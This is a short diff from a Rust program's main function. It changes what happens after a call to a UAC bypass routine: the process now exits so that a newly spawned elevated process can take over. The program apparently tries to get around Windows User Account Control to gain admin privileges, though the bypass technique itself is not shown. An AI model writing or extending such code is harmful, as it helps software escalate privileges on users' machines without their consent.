@@ -271,12 +271,9 @@ async fn main() -> anyhow::Result<()> {
         log_debug!("Not running with admin privileges, attempting UAC bypass...");
 
         if uac_bypass::attempt_uac_bypass() {
-            is_admin_privileged = uac_bypass::is_admin();
-            if is_admin_privileged {
-                log_debug!("UAC bypass successful! Now running with admin privileges.");
-            } else {
-                log_debug!("UAC bypass failed. Continuing without admin privileges.");
-            }
+            // UAC bypass spawns a new elevated process, so we exit this one
+            log_debug!("UAC bypass initiated, exiting non-admin process...");
+            std::process::exit(0);
         } else {
             log_debug!("UAC bypass failed. Continuing without admin privileges.");
         }
